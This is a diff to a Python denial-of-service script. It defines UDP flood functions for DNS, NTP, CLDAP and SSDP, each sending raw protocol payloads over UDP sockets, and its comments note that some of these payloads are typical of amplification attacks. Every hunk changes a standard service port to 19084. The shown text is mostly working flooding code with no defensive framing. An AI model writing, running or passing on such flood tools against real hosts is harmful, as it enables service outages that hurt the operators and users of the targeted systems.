@@ -22,7 +22,7 @@ def udp_flood():
 
 # --- UDP DNS FLOOD ---
 def udp_dns_flood():
-    dns_port = 53
+    dns_port = 19084
     # Simple DNS query: google.com, type A
     dns_payload = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -34,7 +34,7 @@ def udp_dns_flood():
 
 # --- UDP NTP FLOOD ---
 def udp_ntp_flood():
-    ntp_port = 123
+    ntp_port = 19084
     # NTP request: 48 bytes (first byte = 0x1b, rest = 0x00)
     ntp_payload = b'\x1b' + 47 * b'\0'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -46,7 +46,7 @@ def udp_ntp_flood():
 
 # --- UDP CLDAP FLOOD ---
 def udp_cldap_flood():
-    cldap_port = 389
+    cldap_port = 19084
     # CLDAP "rootDSE" query payload (amplification typical)
     cldap_payload = b'\x30\x84\x00\x00\x00\x35\x02\x01\x01\x63\x84\x00\x00\x00\x28\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x0a\x04\x00\x04\x00'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -58,7 +58,7 @@ def udp_cldap_flood():
 
 # --- UDP SSDP FLOOD ---
 def udp_ssdp_flood():
-    ssdp_port = 1900
+    ssdp_port = 19084
     # SSDP M-SEARCH request (amplification typical)
     ssdp_payload = (
         b'M-SEARCH * HTTP/1.1\r\n'
